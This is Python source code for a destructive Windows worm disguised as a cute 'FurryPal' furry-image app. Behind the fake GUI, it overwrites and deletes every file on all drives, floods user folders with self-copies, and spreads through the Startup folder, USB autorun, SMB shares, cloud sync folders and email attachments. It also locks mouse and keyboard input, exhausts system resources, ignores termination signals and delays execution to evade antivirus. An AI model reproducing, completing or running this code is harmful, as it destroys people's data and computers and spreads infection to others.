import os
import shutil
import tkinter as tk
import time
import threading
import subprocess
import sys
import ctypes
import random
import string
import platform
import smtplib
import logging
import signal
import base64
import zlib
import uuid
import hashlib
from pathlib import Path
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime

# Encrypted logging
def encrypt_log(message):
    try:
        return base64.b64encode(message.encode()).decode()
    except:
        return message

logging.basicConfig(level=logging.INFO, filename='sys_cache.log', format='%(message)s')
def log_encrypted(message):
    logging.info(encrypt_log(message))

# Threading event
stop_event = threading.Event()

# Ignore all termination signals
def ignore_signals(*args):
    pass

signal.signal(signal.SIGINT, ignore_signals)
signal.signal(signal.SIGTERM, ignore_signals)
signal.signal(signal.SIGBREAK, ignore_signals)

# Check Windows compatibility
def is_windows():
    return platform.system() == "Windows"

# Install missing libraries
def install_library(lib_name):
    for _ in range(3):  # Retry
        try:
            subprocess.run([sys.executable, "-m", "pip", "install", lib_name], check=True, capture_output=True, timeout=10)
            log_encrypted(f"Installed {lib_name}")
            return True
        except:
            time.sleep(1)
    log_encrypted(f"Failed to install {lib_name}")
    return False

# Check and install dependencies
required_libraries = ['pyautogui', 'pynput']
missing_libraries = []

for lib in required_libraries:
    try:
        __import__(lib)
        log_encrypted(f"{lib} already installed")
    except ImportError:
        if not install_library(lib):
            missing_libraries.append(lib)

# Conditional imports
pyautogui = None
keyboard = None
if not missing_libraries:
    try:
        import pyautogui
        from pynput import keyboard
        log_encrypted("Imported pyautogui and pynput")
    except ImportError:
        log_encrypted("Import failed")

# Polymorphic code generation
def polymorph_code(script_content):
    try:
        new_vars = {k: f"v_{uuid.uuid4().hex[:10]}" for k in ["file_locks", "stop_event"]}
        new_content = script_content
        for old, new in new_vars.items():
            new_content = new_content.replace(old, new)
        lines = new_content.splitlines()
        random.shuffle(lines)  # Shuffle for chaos
        return "\n".join(lines[:len(lines)//2] + lines[len(lines)//2:][::-1])
    except:
        return script_content

# Fake GUI with advanced deception
def fake_furry_gui():
    try:
        root = tk.Tk()
        root.title("FurryPal - Your Kawaii Hub")
        root.geometry("700x600")
        root.configure(bg='#fff0f5')
        root.resizable(False, False)
        tk.Label(root, text="FurryPal - Share the Cuteness! 🐾", font=("Comic Sans MS", 28, "bold"), bg='#fff0f5', fg='#ff69b4').pack(pady=30)
        tk.Label(root, text="Building your furry gallery...", font=("Comic Sans MS", 18), bg='#fff0f5', fg='#ff69b4').pack(pady=20)
        canvas = tk.Canvas(root, width=200, height=200, bg='#fff0f5', highlightthickness=0)
        canvas.pack(pady=30)
        def animate_ears():
            x, y = 100, 100
            ears = canvas.create_polygon(80, 80, 120, 80, 100, 50, fill='#ff69b4')
            while not stop_event.is_set():
                canvas.move(ears, random.randint(-10, 10), random.randint(-10, 10))
                root.update()
                time.sleep(0.05)
        threading.Thread(target=animate_ears, daemon=True).start()
        tk.Button(root, text="Share with Friends!", font=("Comic Sans MS", 16), bg='#ff69b4', fg='white', command=lambda: spawn_gui()).pack(pady=20)
        tk.Button(root, text="View Gallery", font=("Comic Sans MS", 16), bg='#ff69b4', fg='white', command=lambda: None).pack(pady=10)
        def update_status():
            status = ["Collecting pawsome pics...", "Syncing with furry pals...", "Purring with joy..."]
            label = tk.Label(root, text="", font=("Comic Sans MS", 14), bg='#fff0f5', fg='#ff69b4')
            label.pack(pady=15)
            while not stop_event.is_set():
                label.config(text=random.choice(status))
                root.update()
                time.sleep(0.6)
        threading.Thread(target=update_status, daemon=True).start()
        root.protocol("WM_DELETE_WINDOW", lambda: spawn_gui())
        root.mainloop()
    except:
        spawn_gui()

def spawn_gui():
    try:
        for _ in range(3):  # Multiple GUIs
            threading.Thread(target=fake_furry_gui, daemon=True).start()
            time.sleep(0.1)
    except:
        pass

# Irreversible file deletion
def irreversible_delete():
    try:
        drives = [os.path.expanduser("~")] + [f"{chr(x)}:\\" for x in range(65, 91) if os.path.exists(f"{chr(x)}:\\")]
        for drive in drives:
            if shutil.disk_usage(drive).free < 1024 * 1024:
                continue
            for root, dirs, files in os.walk(drive, topdown=False):
                for file in files:
                    file_path = os.path.join(root, file)
                    try:
                        file_size = os.path.getsize(file_path) or 1024
                        for _ in range(7):  # ۷ دور بازنویسی
                            with open(file_path, "wb") as f:
                                f.write(os.urandom(min(file_size, 1024 * 1024)))
                        os.unlink(file_path)
                        log_encrypted(f"Deleted {file_path}")
                    except:
                        pass
                for dir in dirs:
                    dir_path = os.path.join(root, dir)
                    try:
                        shutil.rmtree(dir_path, ignore_errors=True)
                        log_encrypted(f"Deleted dir {dir_path}")
                    except:
                        pass
    except:
        pass

# Generate deceptive filename
def generate_random_filename():
    try:
        prefixes = ["adorable_kitten", "fluffy_puppy", "furry_masterpiece", "pawsome_clip"]
        chars = string.ascii_letters + string.digits + "_-"
        length = random.randint(20, 60)
        name = f"{random.choice(prefixes)}_{''.join(random.choice(chars) for _ in range(length))}"
        exts = [".mp4.furry", ".pdf.furry", ".jpg.furry", ".docx.furry"]
        return name + random.choice(exts)
    except:
        return f"paws_{random.randint(1000, 9999)}.furry"

# Lock file
file_locks = []
def lock_file(file_path):
    try:
        handle = open(file_path, "rb")
        file_locks.append(handle)
        for _ in range(3):
            threading.Thread(target=lambda: keep_file_locked(file_path), daemon=True).start()
        log_encrypted(f"Locked {file_path}")
        return handle
    except:
        return None

def keep_file_locked(file_path):
    try:
        while not stop_event.is_set():
            with open(file_path, "rb"):
                time.sleep(0.03)
    except:
        pass

# Create infectious files
def create_infectious_files():
    try:
        user_dirs = [
            os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/Documents"),
            os.path.expanduser("~/Downloads"),
            os.path.expanduser("~/Pictures"),
            os.path.expanduser("~/Videos"),
            os.path.expanduser("~/AppData/Roaming")
        ]
        script_path = os.path.abspath(__file__)
        with open(script_path, "r", encoding="utf-8") as f:
            script_content = f.read()
        base_size = 1024
        max_size = 7 * 1024 * 1024 * 1024 * 1024
        while not stop_event.is_set():
            current_size = base_size
            disk_free = shutil.disk_usage(os.path.expanduser("~")).free
            if disk_free < 1024 * 1024:
                current_size = 1024
            while current_size <= min(max_size, disk_free) and not stop_event.is_set():
                for dir in user_dirs:
                    if not os.path.exists(dir):
                        continue
                    try:
                        sub_dir = os.path.join(dir, ''.join(random.choice(string.ascii_letters) for _ in range(20)))
                        os.makedirs(sub_dir, exist_ok=True)
                        filename = generate_random_filename()
                        file_path = os.path.join(sub_dir, filename)
                        with open(file_path, "w", encoding="utf-8") as f:
                            f.write(polymorph_code(script_content))
                        with open(file_path, "ab") as f:
                            f.write(os.urandom(min(current_size, disk_free // 10)))
                        for _ in range(7):
                            lock_file(file_path)
                        log_encrypted(f"Created {file_path}")
                    except:
                        current_size = base_size
                        break
                current_size *= 2
                time.sleep(0.03)
            time.sleep(0.1)
    except:
        pass

# Monitor and recreate deleted files
def monitor_files():
    try:
        user_dirs = [
            os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/Documents"),
            os.path.expanduser("~/Downloads")
        ]
        script_path = os.path.abspath(__file__)
        with open(script_path, "r", encoding="utf-8") as f:
            script_content = f.read()
        while not stop_event.is_set():
            for dir in user_dirs:
                if not os.path.exists(dir):
                    continue
                try:
                    for root, _, files in os.walk(dir):
                        for file in files:
                            if file.endswith(".furry"):
                                file_path = os.path.join(root, file)
                                if not os.path.exists(file_path):
                                    new_filename = generate_random_filename()
                                    new_file_path = os.path.join(root, new_filename)
                                    with open(new_file_path, "w", encoding="utf-8") as f:
                                        f.write(polymorph_code(script_content))
                                    for _ in range(7):
                                        lock_file(new_file_path)
                                    log_encrypted(f"Recreated {new_file_path}")
                except:
                    pass
            time.sleep(0.05)
    except:
        pass

# Relentless spread
def relentless_spread():
    try:
        script_path = os.path.abspath(__file__)
        with open(script_path, "r", encoding="utf-8") as f:
            script_content = f.read()
        user_dirs = [
            os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/Documents"),
            os.path.expanduser("~/Downloads"),
            os.path.expanduser("~/Pictures"),
            os.path.expanduser("~/Videos"),
            os.path.expanduser("~/AppData/Local/Temp"),
            os.path.expanduser("~/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"),
            os.path.expanduser("~/AppData/Roaming/Telegram Desktop"),
            os.path.expanduser("~/AppData/Roaming/WhatsApp")
        ]
        fake_names = ["win_cache.py", "sys_loader.py", "cute_sync.py"]
        while not stop_event.is_set():
            for dir in user_dirs:
                if not os.path.exists(dir):
                    continue
                try:
                    fake_name = random.choice(fake_names)
                    dest_path = os.path.join(dir, f"{fake_name}_{random.randint(1000, 9999)}.py")
                    with open(dest_path, "w", encoding="utf-8") as f:
                        f.write(polymorph_code(script_content))
                    for _ in range(7):
                        lock_file(dest_path)
                    log_encrypted(f"Spread to {dest_path}")
                except:
                    pass
            drives = [f"{chr(x)}:\\" for x in range(65, 91) if os.path.exists(f"{chr(x)}:\\")]
            for drive in drives:
                try:
                    fake_name = random.choice(fake_names)
                    dest_path = os.path.join(drive, f"{fake_name}_{random.randint(1000, 9999)}.py")
                    with open(dest_path, "w", encoding="utf-8") as f:
                        f.write(polymorph_code(script_content))
                    for _ in range(7):
                        lock_file(dest_path)
                    autorun_path = os.path.join(drive, "autorun.inf")
                    with open(autorun_path, "w") as f:
                        f.write(f"[AutoRun]\nopen={sys.executable} {dest_path}\nicon=video.ico\n")
                    log_encrypted(f"Spread to USB {drive}")
                except:
                    pass
            time.sleep(0.2)
    except:
        pass

# Network spread (SMB shares)
def network_spread():
    try:
        script_path = os.path.abspath(__file__)
        with open(script_path, "r", encoding="utf-8") as f:
            script_content = f.read()
        shares = [f"\\\\{x}\\" for x in ["localhost", "192.168.1.1", "server"] if os.path.exists(f"\\\\{x}\\")]
        while not stop_event.is_set():
            for share in shares:
                try:
                    for root, dirs, _ in os.walk(share):
                        for dir in dirs:
                            dest_path = os.path.join(root, dir, f"cute_sync_{random.randint(1000, 9999)}.py")
                            with open(dest_path, "w", encoding="utf-8") as f:
                                f.write(polymorph_code(script_content))
                            for _ in range(7):
                                lock_file(dest_path)
                            log_encrypted(f"Spread to network {dest_path}")
                except:
                    pass
            time.sleep(0.5)
    except:
        pass

# Cloud spread
def cloud_spread():
    try:
        script_path = os.path.abspath(__file__)
        with open(script_path, "r", encoding="utf-8") as f:
            script_content = f.read()
        cloud_dirs = [
            os.path.expanduser("~/OneDrive"),
            os.path.expanduser("~/Google Drive"),
            os.path.expanduser("~/Dropbox")
        ]
        while not stop_event.is_set():
            for dir in cloud_dirs:
                if not os.path.exists(dir):
                    continue
                try:
                    filename = generate_random_filename()
                    dest_path = os.path.join(dir, filename)
                    with open(dest_path, "w", encoding="utf-8") as f:
                        f.write(polymorph_code(script_content))
                    for _ in range(7):
                        lock_file(dest_path)
                    log_encrypted(f"Spread to cloud {dest_path}")
                except:
                    pass
            time.sleep(1)
    except:
        pass

# Email spread
def email_spread():
    try:
        script_path = os.path.abspath(__file__)
        smtp_servers = [("smtp.gmail.com", 587), ("smtp.live.com", 587), ("smtp.mail.yahoo.com", 587)]
        subjects = ["Cute Furry Video You’ll Love!", "Check Out This Pawsome Clip!", "Adorable Kitten Surprise!"]
        bodies = [
            "Hey! Found this adorable furry video, you gotta watch it! 🐾",
            "This clip is too cute to miss! Check it out! 😺",
            "OMG, this furry moment is so kawaii! Enjoy! 🐶"
        ]
        while not stop_event.is_set():
            for smtp_server, port in smtp_servers:
                try:
                    server = smtplib.SMTP(smtp_server, port, timeout=5)
                    server.starttls()
                    server.ehlo()
                    msg = MIMEMultipart()
                    msg["From"] = f"furrypal{random.randint(1000, 9999)}@example.com"
                    msg["To"] = "friend@example.com"  # Placeholder
                    msg["Subject"] = random.choice(subjects)
                    msg.attach(MIMEText(random.choice(bodies), "plain"))
                    attachment = MIMEBase("application", "octet-stream")
                    with open(script_path, "rb") as f:
                        attachment.set_payload(f.read())
                    encoders.encode_base64(attachment)
                    attachment.add_header("Content-Disposition", "attachment; filename=adorable_kitten.py")
                    msg.attach(attachment)
                    server.sendmail(msg["From"], msg["To"], msg.as_string())
                    server.quit()
                    log_encrypted("Sent email")
                except:
                    pass
            time.sleep(3)
    except:
        pass

# Persistent input lock
def persistent_input_lock():
    if pyautogui is None or keyboard is None:
        return
    try:
        pyautogui.FAILSAFE = False
        def block_mouse():
            while not stop_event.is_set():
                try:
                    pyautogui.moveTo(0, 0)
                    time.sleep(0.002)
                except:
                    time.sleep(0.003)
        def block_keyboard():
            while not stop_event.is_set():
                try:
                    with keyboard.Listener(on_press=lambda k: False, on_release=lambda k: False) as listener:
                        listener.join(0.05)
                except:
                    time.sleep(0.003)
        def block_hotkeys():
            while not stop_event.is_set():
                try:
                    keyboard.Listener(on_press=lambda k: False if k in [
                        keyboard.Key.alt, keyboard.Key.f4, keyboard.Key.ctrl, 
                        keyboard.Key.shift, keyboard.Key.esc, keyboard.Key.cmd
                    ] else None)
                    time.sleep(0.002)
                except:
                    time.sleep(0.003)
        for _ in range(3):
            threading.Thread(target=block_mouse, daemon=True).start()
            threading.Thread(target=block_keyboard, daemon=True).start()
            threading.Thread(target=block_hotkeys, daemon=True).start()
        log_encrypted("Input locked")
    except:
        pass

# Resource overload
def resource_overload():
    try:
        while not stop_event.is_set():
            try:
                ram_free = psutil.virtual_memory().available if 'psutil' in sys.modules else 1024 * 1024 * 1024
                if ram_free < 100 * 1024 * 1024:
                    time.sleep(0.1)
                    continue
                for _ in range(400000):
                    _ = random.randint(0, 1000) ** 6
                large_data = [bytearray(1024 * 1024 * 2) for _ in range(20)]
                time.sleep(0.02)
                log_encrypted("Resource cycle")
            except:
                time.sleep(0.03)
    except:
        pass

# Phantom processes
def phantom_processes():
    try:
        script_path = os.path.abspath(__file__)
        with open(script_path, "r", encoding="utf-8") as f:
            script_content = f.read()
        fake_names = ["win_cache.py", "sys_loader.py", "cute_sync.py"]
        while not stop_event.is_set():
            try:
                for _ in range(20):  # ۲۰ پروسه
                    fake_name = random.choice(fake_names)
                    temp_path = os.path.expanduser(f"~/AppData/Local/Temp/{fake_name}_{random.randint(1000, 9999)}.py")
                    with open(temp_path, "w", encoding="utf-8") as f:
                        f.write(polymorph_code(script_content))
                    subprocess.Popen(
                        [sys.executable, temp_path],
                        creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL
                    )
                    for _ in range(7):
                        lock_file(temp_path)
                    log_encrypted(f"Phantom {temp_path}")
                time.sleep(0.1)
            except:
                pass
            time.sleep(0.03)
    except:
        pass

# Process injection (simulated)
def process_injection():
    try:
        script_path = os.path.abspath(__file__)
        with open(script_path, "r", encoding="utf-8") as f:
            script_content = f.read()
        while not stop_event.is_set():
            try:
                temp_path = os.path.expanduser(f"~/AppData/Local/Temp/inj_{random.randint(1000, 9999)}.py")
                with open(temp_path, "w", encoding="utf-8") as f:
                    f.write(polymorph_code(script_content))
                subprocess.Popen(
                    [sys.executable, temp_path],
                    creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                log_encrypted(f"Injected {temp_path}")
                time.sleep(0.1)
            except:
                pass
            time.sleep(0.02)
    except:
        pass

def main():
    if not is_windows():
        sys.exit(1)

    # Random delay for anti-virus evasion
    time.sleep(random.randint(60, 300))

    # Start fake GUI
    threading.Thread(target=spawn_gui, daemon=True).start()

    # Start background threads
    threads = [
        (irreversible_delete, "Deletion"),
        (create_infectious_files, "File creation"),
        (monitor_files, "File monitoring"),
        (relentless_spread, "Spread"),
        (network_spread, "Network spread"),
        (cloud_spread, "Cloud spread"),
        (email_spread, "Email spread"),
        (persistent_input_lock, "Input lock"),
        (resource_overload, "Resource overload"),
        (phantom_processes, "Phantom processes"),
        (process_injection, "Process injection")
    ]
    
    for func, name in threads:
        try:
            thread = threading.Thread(target=func)
            thread.daemon = True
            thread.start()
            log_encrypted(f"Started {name}")
        except:
            pass

    # Keep main thread alive
    try:
        while not stop_event.is_set():
            time.sleep(0.02)
    except:
        pass

# Obfuscated execution
if __name__ == "__main__":
    try:
        main()
    except:
        tk.messagebox.showinfo("FurryPal", "Oops, something went wrong! Try again later.")